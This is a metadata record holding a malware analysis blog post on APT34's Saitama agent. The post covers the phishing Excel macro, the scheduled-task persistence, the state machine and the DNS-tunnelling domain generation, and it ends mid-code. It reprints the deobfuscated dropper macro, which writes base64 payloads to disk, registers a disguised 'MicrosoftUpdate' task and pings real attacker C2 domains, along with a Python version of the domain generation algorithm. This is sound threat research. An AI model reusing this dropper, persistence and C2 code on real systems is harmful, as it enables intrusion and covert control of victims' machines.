{
    "id": "2141248a-0dd2-49bd-91b5-776cda9e27d9",
    "created_at": "2023-01-12T15:02:42.442615Z",
    "updated_at": "2025-03-27T02:14:08.479541Z",
    "deleted_at": null,
    "sha1_hash": "6f3769d1dae0af39a829320b889b85a8956623dc",
    "title": "2022-06-24 - APT34 - Saitama Agent",
    "authors": "",
    "file_creation_date": "2022-07-02T23:19:14Z",
    "file_modification_date": "2022-07-02T23:19:14Z",
    "file_size": 6063573,
    "plain_text": "# APT34 - Saitama Agent\n\n**x-junior.github.io/malware analysis/2022/06/24/Apt34.html**\n\n### Mohamed Ashraf\n\nMalware Analysis & Reverse Engineering & Cryptography\n\n37 minute read\n\n## Introduction\n\n\nJune 24, 2022\n\n\nThe spear phishing email contained a malicious attachment and the malicious attachment droppes APT34 malware named\nSaitama . What interesting in this sample and set it apart from average malware that it’s using a unique DNS tunneling and\nstateful programming ( finite state machine ).\n\n## Stage 1 - Excel Document\n\nThe attached Excel file contains a malicious VBA macro .\nThe document has an image that tries to convince the victim to\nenable a macro.\nAfter enabling the macro, the image is replaced with a one of the Jordan government ministrie’s logo .\n\n\n-----\n\nUsing olevba to get an overview of what the VBA does and extract the macro. It seems it drops and execute a file.\n\n\n-----\n\nHere is the macro after renaming the variable to make it more readable and easy to understand.\n\n\n-----\n\n```\n                      p ( y p g, y g, y\ncc As Integer, ByVal vr As Integer, ByVal ca As Long, ByRef pr As Integer, ByRef pg As LongPtr, ByRef par As\nVariant) As Long\n\nPrivate Declare PtrSafe Sub RtlMoveMemory Lib \"kernel32\" (Dst As Any, Src As Any, ByVal BLen As LongPtr)\n\nPrivate Declare PtrSafe Function VarPtrArray Lib \"VBE7\" Alias \"VarPtr\" (ByRef Var() As Any) As LongPtr\n\nDim random_number As String\n\n#If Win64 Then\n\nConst LS As LongPtr = 8&\n\n#Else\n\nConst LS As LongPtr = 4&\n\n#End If\n\nPrivate Sub WorkbrootFolderk_Open()\n\n  GoTo s1\n\n  Sheets(\"Confirmation Receive Document\").Visible = True\n\n  Sheets(\"Confirmation Receive Documents\").Visible = False\n\n  'Sheets(\"TeamViewer Licenses\").Visible = True\n\n  'Sheets(\"TeamViewer License\").Visible = False\n\n  Exit Sub\n\ns1:\n\n  Sheets(\"Confirmation Receive Documents\").Visible = True\n\n  Sheets(\"Confirmation Receive Document\").Visible = False\n\n  ' Generate 4 digit random rumber\n\n  random_number = CStr(Int((10000 * Rnd())))\n\n  eNotif \"zbabz\"\n\n  ' Create object file\n\n  Set fs = CreateObject(\"Scripting.FileSystemObject\")\n\n  ' Create the TaskService object.\n\n  Set service = CreateObject(\"schedule.service\")\n\n  Call service.Connect\n\n  Dim rootFolder\n\n  On Error Resume Next\n\n  ' Get the task folder that contains the tasks.\n\n  Set rootFolder = service.GetFolder(\"\\\")\n\n  eNotif \"zbbbz\"\n\n  On Error Resume Next\n\n  ' If mouse device is connected\n\n  If Application.MouseAvailable Then\n\n    drop_path = LCase(Environ(\"localappdata\")) & \"\\MicrosoftUpdate\\\"\n\n    If Dir(drop_path, vbDirectory) = \"\" Then\n\n      MkDir drop_path\n\n    End If\n\n     ' drop_path = \\AppData\\Local\\MicrosoftUpdate\\ \n     ' drop following files in drop_path\n\n    malware = drop_path & \"update.exe\" \n\n    config = drop_path & \"update.exe.config\"\n\n    DLL = drop_path & \"Microsoft.Exchange.WebServices.dll\"\n\n     Set objXMLDoc = CreateObject(\"Microsoft.XMLDOM\")\n\n    Set objXmlNode = objXMLDoc.createElement(\"tmp\")\n\n    objXmlNode.DataType = \"bin.base64\"\n\n    objXmlNode.Text = UserForm1.Label1.Caption\n\n    b64_decoded = objXmlNode.NodeTypedValue\n\n    Dim FileNumber As Integer\n\n    FileNumber = FreeFile\n\n    Open malware For Binary Lock Read Write As #FileNumber\n\n```\n\n-----\n\n```\n             y () y\n    Decoded_bytes = b64_decoded\n\n    Put #FileNumber, 1, Decoded_bytes\n\n    Close #FileNumber\n\n    eNotif \"zbaez\"\n\n    objXmlNode.Text = UserForm2.Label1.Caption\n\n    b64_decoded = objXmlNode.NodeTypedValue\n\n    FileNumber = 0\n\n    FileNumber = FreeFile\n\n    Open config For Binary Lock Read Write As #FileNumber\n\n    Decoded_bytes = b64_decoded\n\n    Put #FileNumber, 1, Decoded_bytes\n\n    Close #FileNumber\n\n    eNotif \"zbbez\"\n\n    objXmlNode.Text = UserForm3.Label1.Caption\n\n    b64_decoded = objXmlNode.NodeTypedValue\n\n    FileNumber = 0\n\n    FileNumber = FreeFile\n\n    Open DLL For Binary Lock Read Write As #FileNumber\n\n    Decoded_bytes = b64_decoded\n\n    Put #FileNumber, 1, Decoded_bytes\n\n    Close #FileNumber\n\n    eNotif \"zbcez\"\n\n     ' Create object file\n\n    Set objFSO = CreateObject(\"Scripting.FileSystemObject\")\n\n    If Not objFSO.FileExists(malware) Then\n\n      eNotif \"zbdez\"\n\n      Test\n\n      eNotif \"zbeez\"\n\n    End If\n\n  End If\n\n  eNotif \"zbafz\"\n\n  Dim xmlText As String\n\n  xmlText = \"<?xml version=\"\"1.0\"\" encoding=\"\"UTF-16\"\"?><Task version=\"\"1.2\"\"\nxmlns=\"\"http://schemas.microsoft.com/windows/2004/02/mit/task\"\"><RegistrationInfo><Author>Microsoft\nCorporation</Author><Description>Microsoft Important Update</Description></RegistrationInfo><Triggers><TimeTrigger>\n<Repetition><Interval>PT4M</Interval></Repetition><StartBoundary>\" & Format(DateAdd(\"n\", 1, Now()), \"yyyy-mmddThh:nn:ss\") & \"</StartBoundary><Enabled>true</Enabled></TimeTrigger></Triggers><Principals><Principal\nid=\"\"Author\"\"><LogonType>InteractiveToken</LogonType><RunLevel>LeastPrivilege</RunLevel></Principal></Principals>\n<Settings><MultipleInstancesPolicy>Parallel</MultipleInstancesPolicy>\n<DisallowStartIfOnBatteries>false</DisallowStartIfOnBatteries>\n<StopIfGoingOnBatteries>false</StopIfGoingOnBatteries><AllowHardTerminate>true</AllowHardTerminate>\n<StartWhenAvailable>true</StartWhenAvailable><RunOnlyIfNetworkAvailable>false</RunOnlyIfNetworkAvailable>\"\n\n  xmlText = xmlText & \"<IdleSettings><Duration>PT10M</Duration><WaitTimeout>PT1H</WaitTimeout></IdleSettings>\n<AllowStartOnDemand>true</AllowStartOnDemand><Enabled>true</Enabled><Hidden>false</Hidden>\n<RunOnlyIfIdle>false</RunOnlyIfIdle><WakeToRun>false</WakeToRun><ExecutionTimeLimit>P20D</ExecutionTimeLimit>\n<Priority>7</Priority></Settings><Actions Context=\"\"Author\"\"><Exec><Command>\"\"\" & ofp & \"\"\"</Command>\n<WorkingDirectory>\" & drop_path & \"</WorkingDirectory></Exec></Actions></Task>\"\n\n  ' Paramters: 6 =>TASK_CREATE_OR_UPDATE, 3=> TASK_LOGON_INTERACTIVE_TOKEN)\n\n  Call rootFolder.RegisterTask(\"MicrosoftUpdate\", xmlText, 6,,, 3)\n\n  eNotif \"zbbfz\"\n\nEnd Sub\n\n\n\nSub Test()\n\n  Set objXMLDoc = CreateObject(\"Microsoft.XMLDOM\")\n\n  Set objXmlNode = objXMLDoc.createElement(\"tmp\")\n\n  objXmlNode.DataType = \"bin.base64\"\n\n  objXmlNode.Text = word.Label.Caption\n\n  b64_decoded = objXmlNode.NodeTypedValue\n\n```\n\n-----\n\n```\n  Dim decoded_bytes() As Byte\n\n  decoded_bytes = b64_decoded\n\n  ' VBA code for calling AppDomain.Load using raw vtable lookups for the IUnknown\n\n  ' Upon searching the next line, the following link pop ups\nhttps://gist.github.com/monoxgas/1b36031c5593ebfed3229f4424f77090\n\n  Dim host As New mscoree.CorRuntimeHost, dom As AppDomain\n\n  host.Start\n\n  host.GetDefaultDomain dom\n\n  Dim vRet As Variant, lRet As Long\n\n  Dim vTypes(0 To 1) As Integer\n\n  Dim vValues(0 To 1) As LongPtr\n\n  Dim pPArry As LongPtr: pPArry = VarPtrArray(decoded_bytes)\n\n  Dim pArry As LongPtr\n\n  RtlMoveMemory pArry, ByVal pPArry, LS\n\n  Dim vWrap: vWrap = pArry\n\n  vValues(0) = VarPtr(vWrap)\n\n  vTypes(0) = 16411\n\n  Dim pRef As LongPtr: pRef = 0\n\n  Dim vWrap2: vWrap2 = VarPtr(pRef)\n\n  vValues(1) = VarPtr(vWrap2)\n\n  vTypes(1) = 16396\n\n  lRet = DispCallFunc(ObjPtr(dom), 45 * LS, 4, vbLong, 2, vTypes(0), vValues(0), vRet)\n\n  Dim aRef As mscorlib.assembly\n\n  RtlMoveMemory aRef, pRef, LS\n\n  aRef.CreateInstance \"Saitama.Agent.Program\"\n\nEnd Sub\n\nFunction eNotif(tMsg) 'tMsg = \"zbbfz\",\"zbafz\",\"zbeez\",\"zbdez\",\"zbcez\",\"zbbez\",\"zbaez\", \"zbbbz\", \"zbabz\"\n\n  GetIPfromHostName(\"qw\" & tMsg & random_number & \".joexpediagroup.com\")\n\nEnd Function\n\nFunction GetIPfromHostName(p_sHostName) As String\n\n  On Error GoTo o5\n\n  Dim wmiQuery\n\n  Dim objWMIService\n\n  Dim objPing\n\n  Dim objStatus\n\n  ' Win32_PingStatus WMI class represents the values returned by the standard ping command.\n\n  wmiQuery = \"Select * From Win32_PingStatus Where Address = '\" & p_sHostName & \"'\"\n\n  ' Creating a WMI instance to query information in the cimv2 category.\n\n  Set objWMIService = GetObject(\"winmgmts:\\\\.\\root\\cimv2\")\n\n  Set objPing = objWMIService.ExecQuery(wmiQuery)\n\n  For Each objStatus In objPing\n\n    If objStatus.StatusCode = 0 Then\n\n      GetIPfromHostName = objStatus.ProtocolAddress\n\n    Else\n\n      GetIPfromHostName = \"Unreachable\"\n\n    End If\n\n  Next\n\n  GoTo o6\n\no5:\n\n  GetIPfromHostName = \"someting wrong\"\n\no6:\n\nEnd Function\n\n```\n\n-----\n\n## Macro Capabilities\n\n1. Hides the current sheet and shows the new sheet that contains one of the Jordan government ministry’s logo.\n\n2. Calls the `eNotif function at every step of the macro execution notifying the C2 with the execution progress. To send`\n\na notification it builds different subdomains each step .The domain consists of the following parts\n qw + 5 chars\n```\n   changes depending on the macro stage that identify the macro current stage + 4 random digits +\n   .joexpediagroup.com .It uses the WMI to ping the C2 server.\n\n```\n3. Checks if there is a mouse connected ( avoiding automated analysis ) and if so it Create three files a malicious PE file\n\nis created and dropped in `%LocalAppData%\\MicrosoftUpdate\\update.exe, A configuration file is created and`\ndropped in `%LocalAppData%\\MicrosoftUpdate\\update.exe.config, And the third file dropped in`\n```\n   %LocalAppData%\\MicrosoftUpdate\\Microsoft.Exchange.WebServices.dll, was signed and clean. The files\n\n```\ncontent is in base64 encoded in the excel sheet, by reading the content of the UserForm1.label1, UserForm2.label1\nand UserForm3.label1 they are in base64 format, decodes them and writes them into the created files respectively.\n\n4. Checking that the malicious PE file was successfully created and if not for any reason, it writes it using a technique\n\nthat loads a DotNet assembly directly using mscorlib and Assembly.Load by manually accessing the VTable of the\n[IUnknown. This technique was taken from Github. This technique was not used in this macro since the file was already](https://gist.github.com/monoxgas/1b36031c5593ebfed3229f4)\nCreated, although the function is trying to decode content from word.Label.Caption and it supposed to be\nUserForm1.label1 instead, which actually contains nothing, so it’s a useless function,and the developer was just\ntesting this technique .\n\n5. The macro creates a persistence method for update.exe file. This is done by setting a scheduled task under the name\n\nof the MicrosoftUpdate .\n\n## Scheduled Task\n\nI commented the xml to be easily understandable.\n\n\n-----\n\n```\n                 g\n<Task version=\"\"1.2\"\" xmlns=\"\"http://schemas.microsoft.com/windows/2004/02/mit/task\"\">\n\n  <RegistrationInfo>\n\n    <Author>Microsoft Corporation</Author>\n\n    <Description>Microsoft Important Update</Description>\n\n  </RegistrationInfo>\n\n  <Triggers>\n\n    <TimeTrigger>\n\n      <Repetition>\n\n        <Interval>PT4M</Interval> <!-- Restart task every 4 Minutes -->\n\n      </Repetition>\n\n      <StartBoundary>\" & Format(DateAdd(\"n\", 1, Now()), \"yyyy-mm-ddThh:nn:ss\") & \"</StartBoundary>\n\n      <!-- Specifies the date and time when the trigger is activated. -->\n\n      <Enabled>true</Enabled> <!--Specifies that the trigger is enabled.-->\n\n    </TimeTrigger>\n\n  </Triggers>\n\n  <Principals> <!--Specifies the security contexts that can be used to run the task.-->\n\n    <Principal id=\"\"Author\"\">\n<!-- Specifies the security credentials for a principal. These credentials define the security context that a task\nruns under.-->\n\n      <LogonType>InteractiveToken</LogonType>\n\n      <!-- User must already be logged on. The task will be run only in an existing interactive session.-->\n\n      <RunLevel>LeastPrivilege</RunLevel>\n\n    </Principal>\n\n  </Principals>\n\n  <Settings>\n\n    <MultipleInstancesPolicy>Parallel</MultipleInstancesPolicy>\n\n    <!-- Starts a new instance while an existing instance is running. -->\n\n    <DisallowStartIfOnBatteries>false</DisallowStartIfOnBatteries>\n\n    <!--Specifies that the task will not be started if the computer is running on battery power.-->\n\n    <StopIfGoingOnBatteries>false</StopIfGoingOnBatteries>\n\n    <!--Specifies that the task will be stopped if the computer switches to battery power.-->\n\n    <AllowHardTerminate>true</AllowHardTerminate>\n\n    <!--Specifies if the Task Scheduler service allows hard termination of the task.-->\n\n    <StartWhenAvailable>true</StartWhenAvailable>\n\n    <!--Specifies that the Task Scheduler can start the task at any time after its scheduled time has passed.->\n\n    <RunOnlyIfNetworkAvailable>false</RunOnlyIfNetworkAvailable>\n\n    <!--Specifies that the Task Scheduler will run the task only when a network is available.-->\n\n    <IdleSettings>\n\n     <!--Specifies how the Task Scheduler performs tasks when the computer is in an idle state.-->\n\n      <Duration>PT10M</Duration>\n\n      <!-- 10 Minute --> <!--Specifies how long the computer must be in an idle state before the task is\nrun.-->\n\n      <WaitTimeout>PT1H</WaitTimeout>\n\n    <!-- 1 Hour --> <!--Specifies the amount of time that the Task Scheduler will wait for an idle condition to\n\n    occur. -->\n\n    </IdleSettings>\n\n    <AllowStartOnDemand>true</AllowStartOnDemand>\n\n    <!--Specifies that the task can be started by using either the Run command or the Context menu.-->\n\n    <Enabled>true</Enabled>\n\n    <!--Specifies that the task is enabled. The task can be performed only when this setting is True. -->\n\n    <Hidden>false</Hidden>\n    <!--Specifies, by default, that the task will not be visible in the user interface (UI).-->\n\n    <RunOnlyIfIdle>false</RunOnlyIfIdle> <!--Specifies that the task is run only when the computer is in an\nidle\n\n    state.-->\n\n    <WakeToRun>false</WakeToRun>\n\n    <!--Specifies that Task Scheduler will wake the computer before it runs the task.-->\n\n    <ExecutionTimeLimit>P20D</ExecutionTimeLimit>\n\n    <!-- 20 Days --> <!--Specifies the amount of time allowed to complete the task.-->\n\n    <Priority>7</Priority> <!-- BELOW_NORMAL_PRIORITY_CLASS THREAD_PRIORITY_BELOW_NORMAL-->\n\n  </Settings>\n\n  <Actions Context=\"\"Author\"\">  <!-- Execute the malware -->\n\n    <Exec>\n\n      <Command>\"\"\" & Malware & \"\"\"</Command>\n\n      <WorkingDirectory>\" & drop_path & \"</WorkingDirectory>\n\n    </Exec>\n\n  </Actions>\n\n```\n\n-----\n\n## Macro States Notifications\n\n**C2 Serve** **State**\n\n\nqwzbabz[fourdigits].joexpediagroup[.]com\n\nqwzbbbz[fourdigits].joexpediagroup[.]com\n\nqwzbaez[fourdigits].joexpediagroup[.]com\n\nqwzbbez[fourdigits].joexpediagroup[.]com\n\nqwzbcez[fourdigits].joexpediagroup[.]com\n\nqwzbdez[fourdigits].joexpediagroup[.]com\n\nqwzbeez[fourdigits].joexpediagroup[.]com\n\nqwzbafz[fourdigits].joexpediagroup[.]com\n\nqwzbbfz[fourdigits].joexpediagroup[.]com\n\n## Dropped Configuration\n\n Stage2 .net Malicious File\n\n\nMacro started\n\nConnected successfully to task scheduler to get the task folder that contains the\ntasks\n\nMalware created\n\nConfig created\n\nDLL created\n\nIf the malware is not created\n\nCreate malware if not created\n\nTask scheduler configuration\n\nScheduled task created\n\n\nBefore digging in, we can get an overview about what the malware can do . it seems it can execute commands, compress /\ndecompress capabilities, and it have a pseudorandom number generator . I will start explaining the least interesting parts\nfirst.\n\n\n-----\n\n## Mutex\n\nThe malware creates a mutex object `726a06ad-475b-4bc6-8466-f08960595f1e to avoid having more than one instance`\nrunning. If instance of the malware is already running therefore malware exits.\n\n## Machine States\n\nThe malware utilizes the concept of finite state machine .\n\nThe makeup of a finite state machine consists of the following:\n\n1. A set of potential input events.\n2. A set of probable output events that correspond to the potential input events.\n3. A set of expected states the system can exhibit.\n4 The machine can either move to the next state or stay in the same state\n\n\n-----\n\nIn the following figure, the machine start in a state called `Door Closed, if event called` `opening the door happens the`\nmachine state changes to `Door open .\nSo our malware although have some states and events that make it move to other`\nstates to do malicious activity.\n\nWe can see a dictionary of transactions definitions and an initialization to the current state as `Beign, as example if the`\ncurrent machine state is `Begin and we have a command telling us to` `Start then we are updating the current machine`\nstate to `Alive as seen below, we will get a better understanding of the states idea while we are going through our`\nanalysis.\n\nHere is a table of all possible states and transactions :\n\n**Current Machine State** **Machine Command** **New Machine State**\n\nBegin Start Alive\n\nSleep Start Alive\n\nAlive Failed Sleep (21600000- 28800000)\n\nAlive HasData Receive\n\nReceive Failed Sleep (40000-80000)\n\n\n-----\n\n**Current Machine State** **Machine Command** **New Machine State**\n\nReceive DataReceived Do\n\nDo Failed SecondSleep (1800000- 2700000)\n\nDo HasResult Send\n\nSend Failed Sleep (40000-80000)\n\nSend HasData SendAndReceive\n\nSend DataSended Do\n\nSend DataSendedAndHasData Receive\n\nSendAndReceive Failed Sleep (40000-80000)\n\nSendAndReceive DataReceived Send\n\nSendAndReceive DataSended Receive\n\nSendAndReceive DataSendedAndReceived Do\n\nSecondSleep Start Alive\n\nWe have 8 states, every state have a certain value as seen below :\n\n**MachineState** **Values**\n\nMachineState Begin 0\n\nMachineState Sleep 1\n\nMachineState Alive 2\n\nMachineState Receive 3\n\nMachineState Do 4\n\nMachineState Send 5\n\nMachineState SendAndReceive 6\n\nMachineState SecondSleep 7\n\nSo after initializing the current `MachineState as` `Beign, it enters the first case` `Begin and the current machine state will`\nchange to `Alive and start doing it’s malicious activity .`\n\n## Configuration\n\nThe malware Loades random number into counter variable, initializes domains, and a list of byte array called `listData`\n\n\n-----\n\nHere is some variables in config class and its values which we will see being used in other classes.\n\n**Variable** **Value**\n\nConfig.DelayMinAlive 21600000\n\nConfig.DelayMaxAlive 28800000\n\nConfig.DelayMinCommunicate 40000\n\nConfig.DelayMaxCommunicate 80000\n\nConfig.DelayMinSecondCheck 1800000\n\nConfig.DelayMaxSecondCheck 2700000\n\nConfig.DelayMinRetry 300000\n\nConfig.DelayMaxRetry 420000\n\nConfig.MaxTry 7\n\nConfig.TaskExecTimeout 10800000\n\nConfig.SendCount 12\n\nConfig.CharsDomain “abcdefghijklmnopqrstuvwxyz0123456789”\n\nConfig.CharsCounter “razupgnv2w01eos4t38h7yqidxmkljc6b9f5”\n\nConfig.FirstAliveKey “haruto”\n\nConfig._AgentID null\n\nConfig._MaxCounter 46656\n\nBefore discussing the more important parts. lets first discuss two states `SleepAlive and` `SleepSecond`\n\n## SleepAlive\n\nThe malware can sleep for very long time by calling MakeDelay. `SleepAlive state simply sleeps for certain time then`\nreturn machine command start, so after sleeping the `MahcineState will be` `Alive . you can check the table of states and`\ncommands .\n\n\n-----\n\n## SleepSecond\n\nSame as `SleepAlive except for the argument getting passed to` `MakeDleay fuction.`\n\n## MakeDelay\n\nThe possible arguments for MakeDelay are:\n\n**DelayType** **Values**\n\nEnums.DelayType Alive 0\n\nEnums.DelayType Communicate 1\n\nEnums.DelayType SecondCheck 2\n\nEnums.DelayType Retry 3\n\nDepending on the argument being passed, it initializes min and max values with certain values discussed above in config\ntable .\nthen get a random number between min and max and that random value will be the time to sleep .\n\n\n-----\n\nMakeDelay is called in other states although .\n\n## Alive State\n\nLets start making things a little bit interesting .\nThis malware uses DNS tunneling to communicate with its C2 as we will see\neverything the malware need from the C2 is built into the DNS request.\nThe first state the malware gets in is `Alive .\nFirst`\nthe malware checks if an `AgentId exist which is not, and then call` `TryMe with` `_FirstAlive function as argument .`\n```\nTryMe takes a function as an argument, and try to execute the function that is passed to it, until it return success or the\n\n```\nnumber of tries exceeded `MaxTry, between every try the malware sleep for some time using` `MakeDelay . If number of`\ntries exceeded `MaxTry the malware adds 1 to the counter that was initialized in the first place .`\n```\nFirstAlive constructs a subdomain by passing FirstAlive parameter which is 0 and FirstAliveKey which is\nharuto to the DomainMaker and try to connect to it and get its address .\n\n```\nThere are other possible arguments for the first parameter:\n\n**DomainType** **Values**\n\n\n-----\n\n**DomainType** **Values**\n\nEnums.DomainType FirstAlive 0\n\nEnums.DomainType Send 1\n\nEnums.DomainType Receive 2\n\nEnums.DomainType SendAndReceive 3\n\nEnums.DomainType MainAlive 4\n\n## Python Implementation of the DGA\n\n\n-----\n\n```\n p\nimport base64\n\nCharsDomain = \"abcdefghijklmnopqrstuvwxyz0123456789\"\n\nCharsCounter = \"razupgnv2w01eos4t38h7yqidxmkljc6b9f5\"\n\nclass RandomMersenneTwister():\n\n  def __init__(self, c_seed=5489):\n\n    (self.w, self.n, self.m, self.r) = (32, 624, 397, 31)\n\n    self.a = 0x9908B0DF\n\n    (self.u, self.d) = (11, 0xFFFFFFFF)\n\n    (self.s, self.b) = (7, 0x9D2C5680)\n\n    (self.t, self.c) = (15, 0xEFC60000)\n\n    self.l = 18\n\n    self.f = 1812433253\n\n    self.MT = [0 for i in range(self.n)]\n\n    self.index = self.n+1\n\n    self.lower_mask = 0x7FFFFFFF\n\n    self.upper_mask = 0x80000000\n\n    self.c_seed = c_seed\n\n    self.seed(c_seed)\n\n  def seed(self, num):\n\n    self.MT[0] = num\n\n    self.index = self.n\n\n    for i in range(1, self.n):\n\n      temp = self.f * (self.MT[i-1] ^ (self.MT[i-1] >> (self.w-2))) + i\n\n      self.MT[i] = temp & 0xffffffff\n\n  def twist(self):\n\n    for i in range(0, self.n):\n\n      x = (self.MT[i] & self.upper_mask) + \\\n\n        (self.MT[(i+1) % self.n] & self.lower_mask)\n\n      xA = x >> 1\n\n      if (x % 2) != 0:\n\n        xA = xA ^ self.a\n\n      self.MT[i] = self.MT[(i + self.m) % self.n] ^ xA\n\n    self.index = 0\n\n  def extract_number(self):\n\n    if self.index >= self.n:\n\n      self.twist()\n\n    y = self.MT[self.index]\n\n    y = y ^ ((y >> self.u) & self.d)\n\n    y = y ^ ((y << self.s) & self.b)\n\n    y = y ^ ((y << self.t) & self.c)\n\n    y = y ^ (y >> self.l)\n\n    self.index += 1\n\n    return y & 0xffffffff\n\n  def GetRandomRange(self, minn, maxx):\n\n    num = maxx - minn\n\n    randnum = self.extract_number()\n\n    return minn + (randnum % num)\n\n\n\ndef ConvertIntToDomain(value):\n\n  text = \"\"\n\n  length = len(CharsDomain)\n\n  while 1:\n\n```\n\n-----\n\n```\n                [ g ]\n    value //= length\n\n    if value <= 0:\n\n      break\n\n  return text\n\ndef PadLeft(text,totalWidth,paddingChar):\n\n  if totalWidth < len(text):\n\n    return text\n\n  return paddingChar*(totalWidth-len(text)) + text\n\ndef ConvertIntToCounter(value):\n\n  text = \"\"\n\n  length = len(CharsCounter)\n\n  while 1:\n\n    text = CharsCounter[value % length] + text\n\n    value //= length\n\n    if value <= 0:\n\n      break\n\n  return text\n\ndef MapBaseSubdomainCharacters( data, shuffle):\n\n    text = \"\"\n\n    for i in range(len(data)):\n\n      text += shuffle[CharsDomain.index(data[i])];\n\n    return text\n\ndef Shuffle(seed):\n\n  CharsDomain = \"abcdefghijklmnopqrstuvwxyz0123456789\"\n\n  randomMersenneTwister = RandomMersenneTwister(seed)\n\n  length = len(CharsDomain)\n\n  text2 = \"\"\n\n  for i in range(length):\n\n          randomRange = randomMersenneTwister.GetRandomRange(0,len(CharsDomain))\n\n          text2 += CharsDomain[randomRange];\n\n          CharsDomain = CharsDomain.replace(CharsDomain[randomRange],'')\n\n  return text2\n\n\n## Domain Generation\n\n```\nThe `DomainMaker uses a pseudorandom number generator and other functions seen in the above code .I wont discusses`\nthem since the implementation is clear and easy to understand .\n\nSince our state is `Alive and we are trying to generate its subdomain, once a subdomain is generated, the malware`\nrandomly chooses one of three domains to concatenate with `joexpediagroup[.]com, asiaworldremit[.]com, or`\n```\nuber-asia[.]com .\n\n```\nSteps for generating subdomains :\n\n1. Convert DomainType which is int to character and append data passed to it which is `haruto .`\n2. Use the counter that was randomly generated as a seed to MersenneTwister to generate random numbers and return\n\n36 random char and numbers.\n3. Map step 1 output to the shuffled chars .\n4. Convert seed ( counter ) to char and pad it with the first char in `CharCounter .`\n5. Then append a random domain from the 3 that exists `joexpediagroup.com,` `asiaworldremit.com,` `uber-`\n```\n   asia.com .\n\n```\n6. Generated domain = step 3 output + step 4 output + step 5 output\n7. The counter is increased if the malware was successfully connected to the generated domain .\n\n\n-----\n\nAs example let the counter (seed) be 6537, we can see the generated subdomain in the following snippet:\n```\nseed = 6537\n\nFirstAliveKey = \"haruto\"\n\nshuffle = Shuffle(seed)\n\ndomain = ConvertIntToDomain(0) + FirstAliveKey\n\nDomain = MapBaseSubdomainCharacters(domain, shuffle) + PadLeft(ConvertIntToCounter(seed),3,CharsCounter[0]) + \".\"\n\nprint(Domain + \" [ joexpediagroup.com | asiaworldremit.com | uber-asia.com ]\")\n\nqtqbkz1gay. [ joexpediagroup.com | asiaworldremit.com |uber-asia.com ]\n\n\n```\nIf the malware successfully got the IP of the domain generated, it sets the last octet of the address in `AgentId ex: if the IP`\naddress is 127.0.0.1 so the `AgentId will be 1, which will be used in` `DomainMaker for other states.\nBack to` `Alive`\nfunction, if it was successfully connected to the generated domain and `AgentId is set, it calls` `MainAlive .\nWe can`\nenumerate all possible subdomains to be generated from `FirstAlive by enumerating all possible seeds until 46656 ( max`\ncounter).\n```\nfor seed in range(46656):\n\n  FirstAliveKey = \"haruto\"\n\n  shuffle = Shuffle(seed)\n\n  domain = ConvertIntToDomain(0) + FirstAliveKey\n\n  Domain = MapBaseSubdomainCharacters(domain, shuffle) + PadLeft(ConvertIntToCounter(seed),3,CharsCounter[0]) +\n\".\"\n\n  print(Domain + \" [ joexpediagroup.com | asiaworldremit.com | uber-asia.com ]\")\n\n\n\n## Quick Recap\n\n```\nBefore we continue our analysis lets recap what already happened and put those pieces together .\n\n1. Mutex created .\n2. Machine States dictionary create which control the states transaction, and every state do different job .\n\n\n-----\n\n3. Config intialized .\n4. First state is `Begin and a command` `Start` changes state to `Alive .`\n5. Try to call `FirstAlive untill it succeed or exceed maximum tries.`\n6. `FirstAlive generate subdomain as discussed above .`\n7. `MainAlive is called .`\n\nLet’s dig into `MainAlive state .`\n\n## MainAlive State\n\nThe malware generate different subdomains constructed with the following steps:\n\n1. Convert `AgentId to character .`\n2. Use the counter that was randomly generated as a seed to MersenneTwister to generate random numbers and return\n\n36 random char and numbers.\n3. Map step 1 output to the shuffled chars .\n4. Convert seed ( counter ) to char and pad it with the first char in `CharCounter .`\n5. Then append a random domain from the 3 that exists `joexpediagroup.com,` `asiaworldremit.com,` `uber-`\n```\n   asia.com .\n\n```\n6. Generated domain = step 3 output + step 4 output + step 5 output .\n7. The counter is increased if the malware was successfully connected to the generated domain .\n\nAs example let the `AgentID be 203, we can see the generated subdomain in the following snippet:`\n```\nseed = 6538\n\nagent_id = 203\n\nshuffle = Shuffle(seed)\n\ndomain = ConvertIntToDomain(agent_id)\n\nDomain = MapBaseSubdomainCharacters(domain, shuffle) + PadLeft(ConvertIntToCounter(seed),3,CharsCounter[0]) + \".\"\n\nprint(Domain + \" [ joexpediagroup.com | asiaworldremit.com | uber-asia.com ]\")\n\n6agaq. [ joexpediagroup.com | asiaworldremit.com | uber-asia.com ]\n\n\n```\nWhen DNS is queried for a domain, a DNS server returns an IP address that points to the requested domain.\nThe malware\nthen checks the first octet of the IP address to ensure the value is at least 128 to be considered valid. Perhaps this is a way\nfor the malware to avoid internal IP addresses.\n\nIf the first octet value is at least 128 to, then initialize the data size that will be received by taking the last 3 octet s and that\nwill be the size.\nex : if the IP address is 129.90.100.200 then the size would be : 0x5a64c8\n\n\n-----\n\nIf successfully connected to the generated domain and first octet of the IP is at least 128 then the `MachineState will go to`\n```\nReceive state.\n\n```\nWe can enumerate all possible domain to be generated from `MainAlive state` `11897280 possible domain by`\nenumerating the all possible seeds until 46656 and `AgentId until 255.`\n```\nfor seed in range(46656):\n\n  for agent_id in range(255):\n\n    shuffle = Shuffle(seed)\n\n    domain = ConvertIntToDomain(agent_id)\n\n    Domain = MapBaseSubdomainCharacters(domain, shuffle) + PadLeft(ConvertIntToCounter(seed),3,CharsCounter[0])\n+ \".\"\n\n    print(Domain + \" [ joexpediagroup.com | asiaworldremit.com | uber-asia.com ]\")\n\n\n## Receive State\n\n```\nThis state fetches the C2 server, expecting to receive a command.\n\nThe malware generate different subdomains constructed with the following steps:\n\n1. Passed data = converted `RecieveByteIndex to char padded with the first char in` `CharDomain .`\n2. Convert domaintype to character and + the converted `AgentId to character + data passed.`\n3. Use the counter that was randomly generated as a seed to MersenneTwister to genrate random numbers and return 36\n\nrandom char and numbers.\n4. Map step 1 to the shuffled chars .\n5. Convert seed ( counter ) to char and pad it with the first char in `CharCounter .`\n6. Then append a random domain from the 3 that exists `joexpediagroup.com,` `asiaworldremit.com,` `uber-`\n```\n   asia.com .\n\n```\n7. Generated domain = step 4 output + step 5 output + step 6 output\n8. The counter is increased if the malware was successfully connected to the generated domain .\n\n\n-----\n\nHere is how the domain is generated :\n```\nseed = 6539\n\nAgentID = 203\n\ndomainType = 2\n\nReceiveByteIndex = 0\n\ndata = PadLeft(ConvertIntToDomain(0),3,CharsDomain[0])\n\nshuffle = Shuffle(seed)\n\ndomain = ConvertIntToDomain(domainType) + ConvertIntToDomain(AgentID) + data\n\nDomain = MapBaseSubdomainCharacters(domain, shuffle) + 